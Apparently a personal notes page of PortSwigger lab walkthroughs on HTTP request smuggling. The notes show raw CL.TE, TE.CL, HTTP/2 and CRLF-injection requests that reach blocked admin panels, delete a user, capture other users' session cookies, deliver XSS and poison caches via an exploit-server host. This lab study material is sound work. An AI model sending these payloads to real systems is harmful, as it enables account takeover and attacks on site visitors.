***Http request smuggling, basic CL.TE vulnerability***
Http smuggling CL/TE
Content-Length
Transfer-Encoding
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/d14f5da1-9aba-408c-b9ae-4fe03952f0f3)

**HTTP request smuggling, basic TE.CL vulnerability**


Using nuclei

Yaml

```
id: TE-CL-http-smuggling
info:
  name: HTTP request smuggling, basic TE.CL vulnerability
  author: pdteam
  severity: info
  reference: https://portswigger.net/web-security/request-smuggling/lab-basic-te-cl
http:
  - raw:
    - |+
      POST / HTTP/1.1
      Host: {{Hostname}}
      Content-Type: application/x-www-form-urlencoded
      Content-length: 4
      Transfer-Encoding: chunked
      5c
      GPOST / HTTP/1.1
      Content-Type: application/x-www-form-urlencoded
      Content-Length: 15
      x=1
      0
    - |+
      POST / HTTP/1.1
      Host: {{Hostname}}
      Content-Type: application/x-www-form-urlencoded
      Content-length: 4
      Transfer-Encoding: chunked
      5c
      GPOST / HTTP/1.1
      Content-Type: application/x-www-form-urlencoded
      Content-Length: 15
      x=1
      0
    unsafe: true
    matchers:
      - type: dsl
        dsl:
          - 'contains(body, "Unrecognized method GPOST")'
```
**HTTP request smuggling, confirming a CL.TE vulnerability via differential responses**


Burpesuite request
Will respond with a 404 if successful 
```
POST / HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 35
Transfer-Encoding: chunked
0
GET /404 HTTP/1.1
X-Ignore: X
```


**HTTP request smuggling, confirming a TE.CL vulnerability via differential responses**


Burp Request
```
POST / HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-length: 4
Transfer-Encoding: chunked
5e
POST /404 HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15
x=1
0
```

**HTTP request smuggling, confirming a TE.CL vulnerability via differential responses**


Admin panel block
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/a6a57ba3-6804-466c-ae3d-20156a906f01)




Trying CLTE to acccess blocked 
 
```
POST / HTTP/1.1
Host: 0a10003704e0e26d81f194ed005100f1.web-security-academy.net
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/114.0Cookie: session=I2LwNjHcj1sab81ZQKf7AhSpxWRBS0ya
Content-Type: application/x-www-form-urlencoded
Content-Length: 40
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
X-Ignore: X
```
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/03085687-89d5-467f-9e03-36dff9b1f6e5)




Exploit:
```
POST / HTTP/1.1
Host: 0a10003704e0e26d81f194ed005100f1.web-security-academy.net
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/114.0Cookie: session=I2LwNjHcj1sab81ZQKf7AhSpxWRBS0ya
Content-Type: application/x-www-form-urlencoded
Content-Length: 118
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: localhost
Content-Type: application/x-www-form-urlencoded
Content-Length: 10

x=
```

We now have access to admin
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/de26bfa4-72f3-49cd-8ec6-aecb7828e8f5)


To delete user
```
POST / HTTP/1.1
Host: 0a10003704e0e26d81f194ed005100f1.web-security-academy.net
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/114.0Cookie: session=I2LwNjHcj1sab81ZQKf7AhSpxWRBS0ya
Content-Type: application/x-www-form-urlencoded
Content-Length: 141
Transfer-Encoding: chunked

0

GET /admin/delete?username=carlos HTTP/1.1
Host: localhost
Content-Type: application/x-www-form-urlencoded
Content-Length: 10

x=
```
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/3197cc4d-a501-48e0-a562-428315de63d4)



**Exploiting HTTP request smuggling to bypass front-end security controls, TE.CL vulnerability**

Lab: Exploiting HTTP request smuggling to bypass front-end security controls, TE.CL vulnerability:
This lab involves a front-end and back-end server, and the back-end server doesn’t support chunked encoding. There’s an admin panel at /admin, but the front-end server blocks access to it.
To solve the lab, smuggle a request to the back-end server that accesses the admin panel and deletes the user carlos.
SOLUTION:
In the lab description, it is clearly stated that the front end supports transfer encoding: chunked but the backend server doesn’t. So access the lab and send the request to the burp repeater.
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/2537aa5c-c9f8-465d-8ac3-d3f9af0f3534)

Change the request method to POST and remove the unnecessary headers.
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/83b49fc0-1404-4a5a-b4d9-c8e809c2496a)

Now we need to add our transfer encoding header. And also don't forget to add the trailing new lines.
We can see we are getting 200 ok response, Now we just need to figure out a way to request /admin which we can not access from the front end because of the security controls.
“Make sure update content length is disabled in repeater”
The next step is to create a Get request to /admin in our POST request’s body.
60 ==> SIZE OF OUR CHUNKED DATA
```
POST /admin HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15x=1
0
```
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/56737378-961b-4872-b548-db2155973728)

We can see the admin panel is only available to the local host. To bypass this situation we need to add another host header which has a value of
Payload:
71
```
POST /admin HTTP/1.1
HOST: localhost
Content-Type: application/x-www-form-urlencoded
Content-Length: 15x=1
0
```
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/add05481-9ea8-4ac4-b877-5557f7abe6ae)

Now we just need to delete the Carlos user.
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/7057fb1f-958d-4ad8-afec-aee02fe5f81b)

87 
```
GET /admin/delete?username=carlos HTTP/1.1 
Host: localhost 
Content-Type: application/x-www-form-urlencoded 
Content-Length: 15  x=1 
0
```
This payload will delete the Carlos user.
Now let's see how we can chain this vulnerability to induce XSS in the victim's browser.

From <https://infosecwriteups.com/http-request-smuggling-explained-and-exploited-part-0x3-b61623287603> 

**Exploiting HTTP request smuggling to reveal front-end request rewriting**
front-end and back-end server, and the front-end server doesn't support chunked encoding.

From <https://portswigger.net/web-security/request-smuggling/exploiting/lab-reveal-front-end-request-rewriting> 

Intercept request and change to post
Our response should have search result for follow by the rewritten http request

```
POST / HTTP/1.1
Host: 0ade004c03eb044e80bb21c40037006f.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 124
Transfer-Encoding: chunked

0

POST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 200
Connection: close

search=test
```

Make note of  `x-nDBWAo` header 
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/a09771a0-9fb8-4147-ba3a-f0e53e69f265)





Our exploit to get admin
```
POST / HTTP/1.1
Host: 0ade004c03eb044e80bb21c40037006f.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 147
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
X-nDBWAo-Ip: 127.0.0.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 10
Connection: close

x=1
```


We can now delete the user
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/c7f5346a-3229-42db-89aa-1ac2cf9131fa)




```
POST / HTTP/1.1
Host: 0ade004c03eb044e80bb21c40037006f.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 170
Transfer-Encoding: chunked

0

GET /admin/delete?username=carlos HTTP/1.1
X-nDBWAo-Ip: 127.0.0.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 10
Connection: close

x=1
```

**Exploiting HTTP request smuggling to capture other users' requests**

Intercept a comment submit and modify to the following
Increase second Content-Length to meet your need to show session cookie
```
POST / HTTP/1.1
Host: 0acf00500437c75381604dde003600ed.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 275
Transfer-Encoding: chunked

0

POST /post/comment HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 930
Cookie: session=ckjHb97MUxlfsPWlVtKf7m5RBEKuEort

csrf=vztP4gl8AAblrNS6an7vHFX3eZP4lori&postId=5&name=Carlos+Montoya&email=carlos%40normal-user.net&website=&comment=test
```

Send on burpe
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/428cb6ec-50ac-4c15-a606-1670ccee94ad)

Go back and you should see your session cookie in the comments
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/19334f1f-41d8-435f-a3fd-6fd0cfdc69f7)

Copy the session cookie and csrf token and intercept a login request
Modify to your copied session cookie and csrf token
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/7a8fa68d-d930-4fdd-b8e8-3617180e795e)

Forward request
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/a0542cf1-3152-4445-b225-b23588691592)

**Exploiting HTTP request smuggling to deliver reflected XSS**

On the comment blog page we notice userAgent with the value of our browser 
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/2ab52e74-0e53-48d6-bc5a-20fb5a5bd4b9)




Inject an XSS payload into the User-Agent header and observe that it gets reflected: 

From <https://portswigger.net/web-security/request-smuggling/exploiting/lab-deliver-reflected-xss> 
```
User-Agent: /><script>alert(1)</script>
```
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/eadf8a18-8521-4ae2-9cd0-5d9a1d242614)




Exploit

```
POST / HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 150
Transfer-Encoding: chunked

0

GET /post?postId=5 HTTP/1.1
User-Agent: a"/><script>alert(1)</script>
Content-Type: application/x-www-form-urlencoded
Content-Length: 5

x=1
```

Will trigger on the next visitor 

**Response queue poisoning via H2.TE request smuggling**

Smuggled arbitrary prefix of body  of http/2 request using chunked encoding 

```
POST / HTTP/2
Host: 0a6b00a904086b2082f551eb0030008e.web-security-academy.net
Transfer-Encoding: chunked
Content-Length: 13

0

SMUGGLED
```



Will get a 404 response after to send. Confirmed that you caused the back-end to append the subsequent request to the smuggled prefix
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/9412e439-6e75-4eba-a415-7cc61928aeab)




Send the following request to poison the response queue 
```
POST / HTTP/2
Host: 0a6b00a904086b2082f551eb0030008e.web-security-academy.net
Transfer-Encoding: chunked
Content-Length: 85

0

GET /x HTTP/1.1
Host: 0a6b00a904086b2082f551eb0030008e.web-security-academy.net
```

 Remember to terminate the smuggled request properly by including the sequence \r\n\r\n after the Host header. 

You will receive the 404 response to your own request
Wait for around 5 seconds, then send the request again to fetch an arbitrary response. Most of the time, you will receive your own 404 response. Any other response code indicates that you have successfully captured a response intended for the admin user. Repeat this process until you capture a 302 response containing the admin's new post-login session cookie. 
Send 10 ordinary response  to reset.
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/bc7a5dcb-8dac-4219-a974-f04fbb8415b8)

From <https://portswigger.net/web-security/request-smuggling/advanced/response-queue-poisoning/lab-request-smuggling-h2-response-queue-poisoning-via-te-request-smuggling> 





Copy the session cookie and use it to send the following request to the admin panel 

```
GET /admin HTTP/2
Host: 0a6b00a904086b2082f551eb0030008e.web-security-academy.net
Cookie: session=STOLENESSIONCOOKIE
```
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/dca51d14-bffc-4b67-8714-75db041e3433)





To delete 

```
GET /admin/delete?username=carlos HTTP/2
Host: 0a6b00a904086b2082f551eb0030008e.web-security-academy.net
Cookie: session=eiVlUrLVr93i4N4PmuH0J2fKcumc6Hi9
```
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/d71683aa-c5c9-4416-bd10-6a46a388629c)


**H2.CL Request Smuggling (turn off update content length)**


```
POST / HTTP/2
Host: 0a130085036f6110833823da00be0008.web-security-academy.net
Content-Length: 0

SMUGGLED
```
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/fd33dc7f-18c0-41ba-bb7c-2f882e599acb)


• Observe that every second request you send receives a 404 response, confirming that you have caused the back-end to append the subsequent request to the smuggled prefix. 

From <https://portswigger.net/web-security/request-smuggling/advanced/lab-request-smuggling-h2-cl-request-smuggling> 

Create the following request to smuggle the start of a request for /resources, along with an arbitrary Host header: 

From <https://portswigger.net/web-security/request-smuggling/advanced/lab-request-smuggling-h2-cl-request-smuggling> 
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/57286361-598c-4808-89b8-5d87e80dd618)










• Send the request a few times. Notice that smuggling this prefix past the front-end allows you to redirect the subsequent request on the connection to an arbitrary host. 

From <https://portswigger.net/web-security/request-smuggling/advanced/lab-request-smuggling-h2-cl-request-smuggling> 

```
POST / HTTP/2
Host: 0a130085036f6110833823da00be0008.web-security-academy.net
Content-Length: 60

GET /resources HTTP/1.1
Host: foo
Content-Length: 5

x=1
```
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/30ee1e02-8b2f-4099-973e-2e664aebacda)






Go to the exploit server and change the file path to `/resources`. In the body, enter the payload `alert(document.cookie)` then store the exploit.

From <https://portswigger.net/web-security/request-smuggling/advanced/lab-request-smuggling-h2-cl-request-smuggling> 


Resend and confirm that you a redirected to the exploit server 
```
POST / HTTP/2
Host: 0a130085036f6110833823da00be0008.web-security-academy.net
Content-Length: 116

GET /resources HTTP/1.1
Host: exploit-0ad50048033961258315229901bc0095.exploit-server.net/resources
Content-Length: 5

x=1
```

![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/b59eb779-1305-4f65-b268-988420d01a95)

**HTTP/2 request smuggling via CRLF injection**

Our session cookie is tied to our search history
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/29e2adf3-ec1b-4681-b1e2-e03784bf2363)


Removing and refreshing sessions will reset search history so our search is tied to session cookie
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/4ae10be1-4f31-4a3a-8b97-82dfbf5bc69f)






To exploit
Add a new header using Response Headers via Inspector  should get a 404 not found 


```
Name 
foo 
Value 
bar\r\n
Transfer-Encoding: chunked
```

From <https://portswigger.net/web-security/request-smuggling/advanced/lab-request-smuggling-h2-request-smuggling-via-crlf-injection> 

In the body, attempt to smuggle an arbitrary prefix as follows: 
```
0 

SMUGGLED
```

From <https://portswigger.net/web-security/request-smuggling/advanced/lab-request-smuggling-h2-request-smuggling-via-crlf-injection> 

![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/6efa75ce-56ab-4b29-9d67-679150a44d46)





Observe that every second request you send receives a 404 response, confirming that you have caused the back-end to append the subsequent request to the smuggled prefix 

From <https://portswigger.net/web-security/request-smuggling/advanced/lab-request-smuggling-h2-request-smuggling-via-crlf-injection> 

![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/8bbc47ea-2fa6-4ec4-961f-ccf6c71de6a0)


Change the body to the following


```
0

POST / HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Cookie: session=YOUR-SESSION-COOKIE
Content-Length: 800

search=x
```

Our get request indicate that we got the victim user session
Copy and change our session cookie and you should have access to the user 
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/35ed1968-a234-44cc-82dc-283743d82f41)


![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/f02f495a-7d6f-414e-bc7e-70e451426a2b)


**HTTP/2 request splitting via CRLF injection**




Change path of get request to no existing path to get a 404 request
/x


To poison we add the following to the response header in inspector tab (shift+return)

```
Name:
foo

Value:
bar\r\n
\r\n
GET /x HTTP/1.1\r\n
Host: YOUR-LAB-ID.web-security-academy.net
```


Note
If you receive some 200 responses but can't capture a 302 response even after a lot of attempts, send 10 ordinary requests to reset the connection and try again. 

From <https://portswigger.net/web-security/request-smuggling/advanced/lab-request-smuggling-h2-request-splitting-via-crlf-injection> 
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/f0202da5-fcff-4271-88b2-5704ac1de533)

Send until you get a 302 request
/admin directory
Copy the victim session cookie and replace it and you should be able to delete users 

![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/bda93fb2-7a00-4e2e-8ce7-97ab1efff61c)

**Exploiting HTTP request smuggling to perform web cache poisoning**

Capture a request to next post  and smuggled request with different host header

```
POST / HTTP/1.1
Host: 0a12004404739ba183c707a400300006.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 135
Transfer-Encoding: chunked

0

GET /post/next?postId=4 HTTP/1.1
Host: ANYTHING
Content-Type: application/x-www-form-urlencoded
Content-Length: 10

x=1
```

Our  location got redirected to a host of our choice 
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/7ca4d145-8acb-4e40-9414-e2d15314a0fe)



On our exploit server 
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/fbb03e4f-562c-4b7d-b47f-e0052c8c9601)


Change our ANYTHING host to our exploit server and intercept a request from /resources/js/tracking.js
Add both to group and Separate connection for each request

```
POST / HTTP/1.1
Host: 0af500e903aec00281f025d700c80007.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 180
Transfer-Encoding: chunked

0

GET /post/next?postId=3 HTTP/1.1
Host: exploit-0a8100e9036bc025811d243a016e009e.exploit-server.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 10

x=1
```

Send group
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/74402595-d086-4610-a9d5-1c99f6379ff9)





Notice host changed to our exploit server on Location
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/32589dcc-a024-499b-8c49-be751972079e)






Should get an alert textbox when we refresh site

![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/ac612921-6dbb-4fbf-9df2-be98df4f6a19)











